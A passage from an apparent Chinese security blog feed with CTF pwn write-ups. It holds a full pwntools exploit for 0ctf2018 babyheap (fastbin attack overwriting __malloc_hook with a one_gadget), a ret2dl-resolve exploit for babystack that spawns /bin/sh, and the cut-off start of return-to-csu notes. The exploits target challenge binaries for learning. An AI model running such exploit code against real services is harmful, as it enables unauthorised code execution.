arena</span><br></pre></td></tr></table></figure><p>需要注意的是main_arena + 32 + 5是什么？<br>还记得我们之前分配并free的xx = alloc(0x58)么？它在fastbin占位，于是它的地址的第一个字节，如图，0x55，正好可以帮我们绕过对于分配fastbin时，对size的验证。<br>这里顺便提一下这个验证：<br>在malloc时会进行一个校验，当size是fastbin的情况下，如果从fastbin取出的第一块chunk的(unsigned long)size不属于该fastbin中的时候就会发生memory corruption(fast)错误。<br>主要检查方式是根据malloc的bytes大小取得index后，到对应的fastbin去找，取出第一块后检查该chunk的size是否属于该fastbin。<br><strong>于是我们的chunk就被分配到了这里！</strong><br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-02-201604.jpg" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-02-201728.jpg" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-02-201552.jpg" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">update(arena,&quot;\x00&quot;*3 + &quot;\x00&quot;*32 + p64(fake_chunk2)) </span><br><span class="line"># 修改top_chunk为fake_chunk2   用\x00填充fastbins，于是下一次分配将会从我们伪造的top_chunk(fake_chunk2)开始.</span><br><span class="line"># 而伪造的top_chunk刚好就在malloc_hook的上方附近。</span><br><span class="line">winit = alloc(0x48)#从伪造的top_chunk开始分配，从而得到malloc_hook上方的空间的chunk</span><br><span class="line">update(winit,&quot;\x00&quot;*3 + &quot;\x00&quot;*16 + p64(libc + 0x3f35a)) #覆盖__malloc_hook到one_gadget</span><br><span class="line">alloc(0x10,nowait=True) # 触发one_gadget来getshell</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">struct malloc_state</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  ...</span><br><span class="line">  /* Fastbins */</span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"> </span><br><span class="line">  /* Base of the topmost chunk -- not otherwise kept in a bin */</span><br><span class="line">  mchunkptr top;</span><br><span class="line">  ...</span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>注意到我们开始就说过的malloc_state,也就是main_arena它的结构体，可以看到top就在fastbin数组的下面，所以我们malloc出了fastbin数组附近之后，就可以覆盖修改top_chunk了。<br>将top_chunk修改为main_arena-0x33，如图，就在malloc_hook上方。<br>接着就可以分配出这块空间，并且对其修改，覆盖__malloc_hook到one_gadget<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-02-202858.png" alt=""><br>顺便提一句，寻找one_gadaget可以参考<a href="http://bestwing.me/2016/12/30/one-gadget-rce/" target="_blank" rel="noopener">这篇文章</a></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"> </span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"><span class="comment"># libc = ELF('./libc.so.6')</span></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">p = process(<span class="string">'./babyheap'</span>)   </span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:   </span><br><span class="line">p = remote(sys.argv[<span class="number">1</span>], int(sys.argv[<span class="number">2</span>]))</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">alloc</span><span class="params">(size,nowait=False)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> nowait:</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">res = p.recvuntil(<span class="string">'Allocated\n'</span>)</span><br><span class="line"><span class="comment"># print "alloc chunk:"</span></span><br><span class="line"><span class="comment"># print int(res.split()[1])</span></span><br><span class="line"><span class="keyword">return</span> int(res.split()[<span class="number">1</span>])</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">update</span><span class="params">(idx,content,size=<span class="number">0</span>)</span>:</span></span><br><span class="line">size = size <span class="keyword">if</span> size <span class="keyword">else</span> len(content)</span><br><span class="line">content = content.ljust(size,<span class="string">"\x00"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line"><span class="comment"># print "update chunk:"</span></span><br><span class="line"><span class="comment"># print str(idx)</span></span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line"><span class="comment"># print "delete chunk"</span></span><br><span class="line"><span class="comment"># print str(idx)</span></span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line"><span class="comment"># print "view chunk"</span></span><br><span class="line"><span class="comment"># print str(idx)</span></span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">']: '</span>)</span><br><span class="line"><span class="keyword">return</span> p.recvuntil(<span class="string">'1. Allocate'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span> </span><br><span class="line"><span class="comment"># create(0x18)</span></span><br><span class="line"><span class="comment"># create(0x10)</span></span><br><span class="line"><span class="comment"># create(0x10)</span></span><br><span class="line"><span class="comment"># update(0,25,'A'*24+'\x41')</span></span><br><span class="line"><span class="comment"># # gdb.attach(p)</span></span><br><span class="line"><span class="comment"># delete(2)</span></span><br><span class="line"><span class="comment"># # delete(0)</span></span><br><span class="line"><span class="comment"># delete(1)</span></span><br><span class="line"><span class="comment"># create(0x30)</span></span><br><span class="line"><span class="comment"># update(1,0x30,'A'*16+p64(0)+p64(0x21)+'\x00'*16)</span></span><br><span class="line"><span class="comment"># create(0x10)</span></span><br><span class="line"><span class="comment"># # create(0x10)</span></span><br><span class="line"><span class="comment"># delete(0)</span></span><br><span class="line"><span class="comment"># delete(2)</span></span><br><span class="line"><span class="comment"># view(1)</span></span><br><span class="line"><span class="comment"># p.recvuntil(']: ')</span></span><br><span class="line"><span class="comment"># res = p.recv(48)[32:40]</span></span><br><span class="line"><span class="comment"># heap_base = u64(res)</span></span><br><span class="line">meh  = alloc(<span class="number">0x10</span>)</span><br><span class="line">ovf  = alloc(<span class="number">0x28</span>)</span><br><span class="line">vic  = alloc(<span class="number">0x20</span>)</span><br><span class="line">fake = alloc(<span class="number">0x20</span>)</span><br><span class="line">alloc(<span class="number">0x20</span>)</span><br><span class="line">update(ovf,<span class="string">'a'</span>*<span class="number">0x28</span> + chr(<span class="number">0x51</span>))</span><br><span class="line">update(fake,p64(<span class="number">-1</span>,sign=<span class="string">'signed'</span>)+p64(<span class="number">-1</span>,sign=<span class="string">'signed'</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line">delete(vic)</span><br><span class="line">bigass = alloc(<span class="number">0x40</span>)</span><br><span class="line">update(bigass,<span class="string">'a'</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line"></span><br><span class="line">delete(meh)</span><br><span class="line">delete(fake)</span><br><span class="line">heap = u64(view(bigass)[<span class="number">0x30</span>:][:<span class="number">8</span>])</span><br><span class="line">log.info(<span class="string">'[*]heap address:'</span>+hex(heap))</span><br><span class="line">fake = alloc(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">update(bigass,<span class="string">'a'</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>)+p64(<span class="number">0xd1</span>))  <span class="comment">#change fake size to 0xd1</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">88</span>,nowait=<span class="keyword">True</span>)</span><br><span class="line">xx = alloc(<span class="number">88</span>)</span><br><span class="line">update(xx,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))  </span><br><span class="line"></span><br><span class="line">delete(fake)   <span class="comment"># free small chunk,add to unsort bins,  fd bk point to  unsort bins addr.</span></span><br><span class="line"></span><br><span class="line">main_arena = u64(view(bigass)[<span class="number">0x30</span>:][:<span class="number">8</span>]) - <span class="number">88</span>     <span class="comment">#compute main_arena addr</span></span><br><span class="line">log.info(<span class="string">'[*]main_arena address:'</span>+hex(main_arena))</span><br><span class="line">libc = main_arena <span class="number">-0x399b00</span></span><br><span class="line">log.info(<span class="string">'[*]libc address:'</span>+hex(libc))</span><br><span class="line">alloc(<span class="number">0x10</span>,nowait=<span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_chunk2 = main_arena - <span class="number">0x33</span></span><br><span class="line">fake_chunk  = main_arena + <span class="number">32</span> + <span class="number">5</span> </span><br><span class="line">fake = alloc(<span class="number">0x48</span>)</span><br><span class="line"></span><br><span class="line">xx = alloc(<span class="number">0x58</span>)</span><br><span class="line"></span><br><span class="line">delete(xx)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">raw_input(<span class="string">'x'</span>)</span><br><span class="line">delete(fake)</span><br><span class="line">raw_input(<span class="string">'x'</span>)</span><br><span class="line">update(bigass,<span class="string">'a'</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>)+p64(<span class="number">0x51</span>)+p64(fake_chunk))</span><br><span class="line"><span class="keyword">print</span> hex(fake_chunk),hex(fake_chunk2)</span><br><span class="line">raw_input(<span class="string">'x'</span>)</span><br><span class="line">alloc(<span class="number">0x48</span>)</span><br><span class="line"></span><br><span class="line">arena = alloc(<span class="number">0x48</span>)</span><br><span class="line"><span class="keyword">print</span> arena</span><br><span class="line">update(arena,<span class="string">"\x00"</span>*<span class="number">3</span> + <span class="string">"\x00"</span>*<span class="number">32</span> + p64(fake_chunk2))</span><br><span class="line">winit = alloc(<span class="number">0x48</span>)</span><br><span class="line">update(winit,<span class="string">"\x00"</span>*<span class="number">3</span> + <span class="string">"\x00"</span>*<span class="number">16</span> + p64(libc + <span class="number">0x3f35a</span>))</span><br><span class="line">raw_input(<span class="string">'x'</span>)</span><br><span class="line">alloc(<span class="number">0x10</span>,nowait=<span class="keyword">True</span>)</span><br><span class="line">    </span><br><span class="line">log.info(<span class="string">'[*]get shell!!!'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><p><img src="http://onc55v8te.bkt.clouddn.com/2018-04-02-150522.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;赛题链接&quot;&gt;&lt;a href=&quot;#赛题链接&quot; class=&quot;headerlink&quot; title=&quot;赛题链接&quot;&gt;&lt;/a&gt;赛题链接&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/eternalsakura/ctf_pwn/blob/master/
      
    
    </summary>
    
      <category term="CTF" scheme="http://eternalsakura13.com/categories/CTF/"/>
    
      <category term="pwn" scheme="http://eternalsakura13.com/categories/CTF/pwn/"/>
    
      <category term="堆利用" scheme="http://eternalsakura13.com/categories/CTF/pwn/%E5%A0%86%E5%88%A9%E7%94%A8/"/>
    
    
      <category term="overlap" scheme="http://eternalsakura13.com/tags/overlap/"/>
    
      <category term="off-by-one" scheme="http://eternalsakura13.com/tags/off-by-one/"/>
    
  </entry>
  
  <entry>
    <title>0ctf2018 babystack writeup</title>
    <link href="http://eternalsakura13.com/2018/04/01/babystack/"/>
    <id>http://eternalsakura13.com/2018/04/01/babystack/</id>
    <published>2018-04-01T06:17:53.791Z</published>
    <updated>2018-04-03T11:50:11.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="赛题链接"><a href="#赛题链接" class="headerlink" title="赛题链接"></a>赛题链接</h2><p><a href="https://github.com/eternalsakura/ctf_pwn/tree/master/0ctf2018/babystack" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/tree/master/0ctf2018/babystack</a></p><h2 id="前置技能"><a href="#前置技能" class="headerlink" title="前置技能"></a>前置技能</h2><h3 id="ret2dl-in-x86"><a href="#ret2dl-in-x86" class="headerlink" title="ret2dl in x86"></a>ret2dl in x86</h3><p>没有能用来leak的漏洞。<br>如下面的代码,除了明显的栈溢出，没有可以用来leak内存布局，bypass aslr的函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">void vulfunc()</span><br><span class="line">&#123;</span><br><span class="line">    char sbuf[10];</span><br><span class="line">    read(0, sbuf, 60);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    vulfunc();</span><br><span class="line">    exit(0);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>本来想写一下原理的，不过其他资料已经讲得非常好了，实在没什么可补充的（其实是我还不怎么懂）。<br><a href="https://www.slideshare.net/AngelBoy1/re2dlresolve" target="_blank" rel="noopener">https://www.slideshare.net/AngelBoy1/re2dlresolve</a><br><a href="http://www.inforsec.org/wp/wp-content/uploads/2016/01/sec15-paper-di-frederico.pdf" target="_blank" rel="noopener">http://www.inforsec.org/wp/wp-content/uploads/2016/01/sec15-paper-di-frederico.pdf</a><br><a href="http://skysider.com/?p=416" target="_blank" rel="noopener">http://skysider.com/?p=416</a><br>学习过程中最好找个程序，然后对着_dl_runtime_resolve源码服用，效果更佳，然后再看图就思路清晰了。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>alarm用keypatch先nop掉<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-01-092544.png" alt=""><br>可以看出有很明显的栈溢出漏洞，但是只有一个read，没有可以用来leak的函数，所以用ret2dl的解法<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-01-092629.png" alt=""></p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ol><li>通过栈溢出来调用read函数在bss段写我们需要的结构和/bin/sh</li><li>然后使用dl_resolve_call去调用system，得到shell。</li></ol><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> roputils</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">offset = <span class="number">44</span></span><br><span class="line">readplt = <span class="number">0x08048300</span></span><br><span class="line">bss = <span class="number">0x0804a020</span></span><br><span class="line">vulFunc = <span class="number">0x0804843B</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./babystack'</span>)</span><br><span class="line"><span class="comment"># p = remote('202.120.7.202', 6666)</span></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getReloc</span><span class="params">(elf, base)</span>:</span></span><br><span class="line">    jmprel = elf.dynamic(<span class="string">'JMPREL'</span>)</span><br><span class="line">    relent = elf.dynamic(<span class="string">'RELENT'</span>)</span><br><span class="line"></span><br><span class="line">    addr_reloc, padlen_reloc = elf.align(base, jmprel, relent)</span><br><span class="line">    reloc_offset = addr_reloc - jmprel</span><br><span class="line">    <span class="keyword">return</span> reloc_offset</span><br><span class="line"></span><br><span class="line">rop = roputils.ROP(<span class="string">'./babystack'</span>)</span><br><span class="line">addr_bss = rop.section(<span class="string">'.bss'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># step1 : write sh &amp; resolve struct to bss</span></span><br><span class="line">buf1 = <span class="string">'A'</span> * offset <span class="comment">#44</span></span><br><span class="line">buf1 += p32(readplt) + p32(vulFunc) + p32(<span class="number">0</span>) + p32(addr_bss) + p32(<span class="number">100</span>)</span><br><span class="line">p.send(buf1)</span><br><span class="line"></span><br><span class="line">buf2 =  rop.string(<span class="string">'/bin/sh'</span>)</span><br><span class="line">buf2 += rop.fill(<span class="number">20</span>, buf2)</span><br><span class="line">buf2 += rop.dl_resolve_data(addr_bss+<span class="number">20</span>, <span class="string">'system'</span>)</span><br><span class="line">buf2 += rop.fill(<span class="number">100</span>, buf2)</span><br><span class="line">p.send(buf2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#step2 : use dl_resolve_call get system &amp; system('/bin/sh')</span></span><br><span class="line">buf3 = <span class="string">'A'</span>*<span class="number">44</span> + rop.dl_resolve_call(addr_bss+<span class="number">20</span>, addr_bss)</span><br><span class="line">p.send(buf3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="http://onc55v8te.bkt.clouddn.com/2018-04-01-091535.png" alt=""></p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>ret2dl方法是hook师傅教我的，我也没全看懂，只是理解了基本思路后，整个过程用roputils工具来实现的,工具我放在了我的<a href="https://github.com/eternalsakura/ctf_pwn/blob/master/roputils.py" target="_blank" rel="noopener">github</a>上。<br>依然不懂怎么手工构造，而且程序再换成64位也就不会，还要学习一下。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;赛题链接&quot;&gt;&lt;a href=&quot;#赛题链接&quot; class=&quot;headerlink&quot; title=&quot;赛题链接&quot;&gt;&lt;/a&gt;赛题链接&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/eternalsakura/ctf_pwn/tree/master/
      
    
    </summary>
    
      <category term="CTF" scheme="http://eternalsakura13.com/categories/CTF/"/>
    
      <category term="pwn" scheme="http://eternalsakura13.com/categories/CTF/pwn/"/>
    
      <category term="栈溢出" scheme="http://eternalsakura13.com/categories/CTF/pwn/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
    
      <category term="ret2dl" scheme="http://eternalsakura13.com/tags/ret2dl/"/>
    
  </entry>
  
  <entry>
    <title>return2csu学习笔记</title>
    <link href="http://eternalsakura13.com/2018/03/31/return2csu/"/>
    <id>http://eternalsakura13.com/2018/03/31/return2csu/</id>
    <published>2018-03-31T08:28:59.847Z</published>
    <updated>2018-03-31T12:56:41.694Z</updated>
    
    <content type="html"><![CDATA[<h2 id="议题下载链接"><a href="#议题下载链接" class="headerlink" title="议题下载链接"></a>议题下载链接</h2><p><a href="https://www.blackhat.com/docs/asia-18/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/asia-18/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR.pdf</a><br><a href="https://www.blackhat.com/docs/asia-18/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/asia-18/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf</a></p><h3 id="ASLR简述"><a href="#ASLR简述" class="headerlink" title="ASLR简述"></a>ASLR简述</h3><p><img src="http://onc55v8te.bkt.clouddn.com/2018-03-31-084818.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-31-084852.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-31-090234.png" alt=""></p><p>由于程序的堆、栈分配与共享库的装载都是在运行时进行, 系统在程序每次执行时, <strong>随机地分配程序堆栈的地址以及共享库装载的地址</strong>。尽管它们之间的相对位置没有改变, 但每次执行的差异仍然是页级的, 攻击者将无法预测自己写入的数据区的确切虚拟地址。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-31-090311.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-31-090517.png" alt=""></p><h3 id="The-Attached-code"><a href="#The-Attached-code" class="headerlink" title="The Attached code"></a>The Attached code</h3><p><img src="http://onc55v8te.bkt.clouddn.com/2018-03-31-091057.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-31-090925.png" alt=""><br>我只写了一个main函数，那其他的函数是怎么来的呢？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span 